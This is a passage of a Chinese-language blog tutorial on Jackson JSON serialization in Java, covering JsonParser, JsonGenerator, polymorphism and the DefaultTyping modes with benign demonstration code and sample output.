class="line"><span class="comment">&#123;&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;password&quot;&#125;</span></span><br><span class="line"><span class="comment">----------反序列化操作开始----------</span></span><br><span class="line"><span class="comment">调用了无参构造方法</span></span><br><span class="line"><span class="comment">调用了 setUsername 方法</span></span><br><span class="line"><span class="comment">调用了 setPassword 方法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化的时候会调用getter方法，而反序列化的时候会调用setter方法和无参构造函数，具体为什么能触发getter方法，这个之前讲原生反序列化的时候就学过了，如何触发setter方法在后面会讲到</p>
+<h2 id="JsonParser"><a href="#JsonParser" class="headerlink" title="JsonParser"></a>JsonParser</h2><p>Jackson JsonParser类是一个底层一些的JSON解析器。 它类似于XML的Java StAX解析器，差别是JsonParser解析JSON而不解析XML。需要关注的是，JsonParser的运行层级要低于ObjectMapper。这也使得JsonParser运行速度比ObjectMapper 更快，但是由于层级低，要操作的步骤相对更复杂。</p>
+<p>使用JsonParser需要先创建一个JsonFactory，然后利用createParser()创建JSON解析器</p>
+<p>举个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        System.out.println(<span class="string">&quot;----------JsonParser反序列化操作----------&quot;</span>);</span><br><span class="line">        <span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line">        <span class="type">JsonParser</span> <span class="variable">jsonParser</span> <span class="operator">=</span> factory.createParser(json);</span><br><span class="line">        System.out.println(jsonParser);</span><br><span class="line"></span><br><span class="line"><span class="comment">//com.fasterxml.jackson.core.json.ReaderBasedJsonParser@1ddc4ec2</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时输出了该解析器对象在内存中的地址，对于不同的JSON内容也是可以处理的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 String</span></span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser1</span> <span class="operator">=</span> factory.createParser(jsonString);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 InputStream</span></span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser2</span> <span class="operator">=</span> factory.createParser(inputStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 Reader</span></span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser3</span> <span class="operator">=</span> factory.createParser(reader);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 File</span></span><br><span class="line"><span class="type">JsonParser</span> <span class="variable">parser4</span> <span class="operator">=</span> factory.createParser(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;data.json&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>由于JsonParser是 <strong>Jackson Streaming API（流式 API）</strong> ，而它会把 JSON 拆成一连串 <strong>JsonToken</strong>，我们需要通过移动游标去读取这些Token并进行处理</p>
+<p>一些基础的Token值</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251205191402923.png" alt="image-20251205191402923"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonFactory;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonParser;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonToken;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;user\&quot;,\&quot;password\&quot;:\&quot;password\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------JsonParser反序列化操作----------&quot;</span>);</span><br><span class="line">        <span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line">        <span class="type">JsonParser</span> <span class="variable">jsonParser</span> <span class="operator">=</span> factory.createParser(json);</span><br><span class="line"><span class="comment">//        System.out.println(jsonParser);</span></span><br><span class="line">        <span class="keyword">while</span>(!jsonParser.isClosed())&#123;</span><br><span class="line">            <span class="type">JsonToken</span> <span class="variable">token</span> <span class="operator">=</span> jsonParser.nextToken();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (token == <span class="literal">null</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">&quot;当前Token类型: &quot;</span> + token);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (JsonToken.FIELD_NAME.equals(token)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot; -&gt; 字段名: &quot;</span> + jsonParser.getCurrentName());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JsonToken.VALUE_STRING.equals(token) || JsonToken.VALUE_NUMBER_INT.equals(token)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot; -&gt; 值: &quot;</span> + jsonParser.getText());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">----------JsonParser反序列化操作----------</span></span><br><span class="line"><span class="comment">当前Token类型: START_OBJECT</span></span><br><span class="line"><span class="comment">当前Token类型: FIELD_NAME -&gt; 字段名: username</span></span><br><span class="line"><span class="comment">当前Token类型: VALUE_STRING -&gt; 值: user</span></span><br><span class="line"><span class="comment">当前Token类型: FIELD_NAME -&gt; 字段名: password</span></span><br><span class="line"><span class="comment">当前Token类型: VALUE_STRING -&gt; 值: password</span></span><br><span class="line"><span class="comment">当前Token类型: END_OBJECT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>对于不同的字段类型，JsonParser提供了不同的方法去获取值，例如如果字段是字符串类型，则可以通过getValueAsString()返回当前字段的值作为字符串，如果字段是整数类型，则可以通过getValueAsInt()返回当前字段的值作为int值，其他方法也有很多，就不一一列举了</p>
+<p>JsonParser主要是用来处理反序列化的，但是可以看到这里并不会触发什么特别的方法，所以也就无需深究了</p>
+<h2 id="JsonGenerator"><a href="#JsonGenerator" class="headerlink" title="JsonGenerator"></a>JsonGenerator</h2><p>和JsonParser相反，JsonGenerator主要是用来处理序列化的，能将Java对象序列化成JSON数据</p>
+<p>同样的，使用JsonParser需要先创建一个JsonFactory，然后利用createGenerator()创建JSON生成器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonEncoding;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonFactory;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonGenerator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonFactory</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JsonGenerator</span> <span class="variable">generator</span> <span class="operator">=</span> factory.createGenerator(outputStream, JsonEncoding.UTF8);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//表示开始一个 JSON 对象</span></span><br><span class="line">        generator.writeStartObject();</span><br><span class="line">        generator.writeStringField(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">        generator.writeStringField(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;pass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//表示开始一个 JSON 数组</span></span><br><span class="line">        generator.writeFieldName(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        generator.writeStartArray();</span><br><span class="line">        generator.writeString(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        generator.writeString(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//表示结束一个 JSON 数组</span></span><br><span class="line">        generator.writeEndArray();</span><br><span class="line">        <span class="comment">//表示结束一个 JSON 对象</span></span><br><span class="line">        generator.writeEndObject();</span><br><span class="line">        generator.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(outputStream.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&#123;&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;Test&quot;:[&quot;aaa&quot;,&quot;bbb&quot;]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Java多态"><a href="#Java多态" class="headerlink" title="Java多态"></a>Java多态</h1><p>这个知识点之前我也有记录过：<a href="https://wanth3f1ag.top/2025/08/26/Java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/?highlight=java#%E5%A4%9A%E6%80%81">https://wanth3f1ag.top/2025/08/26/Java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/?highlight=java#%E5%A4%9A%E6%80%81</a></p>
+<p>简单来说，<strong>Java多态就是通过同一个接口使用不同的实例从而可以执行不同的操作</strong>，它阐述了一个事实：Java的实例方法调用是基于运行时的实际类型的动态调用，而非变量声明的类型</p>
+<p>那么在反序列化中，如果需要对多态类的某个子类实例进行序列化和反序列化的时，我们该如何确保我们最终反序列化出来的实例是我们想要的特定子类的实例而非多态类的其他子类实例呢？这时候就需要进行多态问题的解决了——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
+<h1 id="多态问题的解决"><a href="#多态问题的解决" class="headerlink" title="多态问题的解决"></a>多态问题的解决</h1><p><strong>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化</strong>，在反序列化某个类对象的过程中，如果类的成员变量不是一个具体类型，比如Object，接口或抽象类，则可以在JSON字符串中指定其具体类型，jackson将根据指定类型生成具体类型的实例对象</p>
+<p>简单而言，就是将具体的子类信息绑定在序列化的内容中，以便后续反序列化的时候能直接得到目标子类对象，实现方法有两种：</p>
+<ul>
+<li>DefaultTyping</li>
+<li>@JsonTypeInfo注解</li>
+</ul>
+<h2 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h2><p>在com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping中设置了四个值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;</span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">    NON_FINAL,</span><br><span class="line">    EVERYTHING</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h3><p>当被序列化或反序列化的类里的属性被声明为一个Object类型时 会对该Object类型的属性进行序列化和反序列化 并明确规定类名（Object类本身也需要是一个可序列化&#x2F;反序列化的类）</p>
+<p>举个例子</p>
+<p>我们在User里面加一个Object object属性及其对应的getter和setter方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, String password, Object object)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了有参构造方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getObject 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setObject 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getUsername 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setUsername 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getPassword 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setPassword 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们测试一下（Person类是我另外写的一个类，这里就不放了）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="keyword">new</span> <span class="title class_">Person</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------反序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.readValue(json, User.class);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251205195713048.png" alt="image-20251205195713048"></p>
+<p>可以看到没有开启JAVA_LANG_OBJECT的时候并没有找到Person类这个对象，它直接抛弃了Person类的信息而自动反序列化成了LinkedHashMap，那我们开启试试呢？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  <span class="comment">//开启JAVA_LANG_OBJECT</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251205195835585.png" alt="image-20251205195835585"></p>
+<p>可以看到此时object变量在反序列化的时候也反序列化了一个Person对象，也就是说在反序列化的时候，它会将类中属性夹带的其他类还原出来</p>
+<h3 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h3><p>当类中有Interface AbstractClass类时 对其进行序列化和反序列化，这也是enableDefaultTyping() 的默认无参数时的选项（要求和上面第一个是一样的）</p>
+<p>手写一个接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Username</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后写一个继承了接口的实现类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Username</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String Username;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.Username = Username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们测试一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="keyword">new</span> <span class="title class_">MyUsername</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  //开启JAVA_LANG_OBJECT</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------反序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.readValue(json, User.class);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没设置的时候</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251205201059476.png" alt="image-20251205201059476"></p>
+<p>设置了之后</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251205201157233.png" alt="image-20251205201157233"></p>
+<h3 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h3><p>支持 Arrays 类型</p>
+<p>例如我们在Object类中存放User的对象数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        User[] users = <span class="keyword">new</span> <span class="title class_">User</span>[<span class="number">2</span>];</span><br><span class="line">        users[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        users[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;password&quot;</span>,users);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------反序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.readValue(json, User.class);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
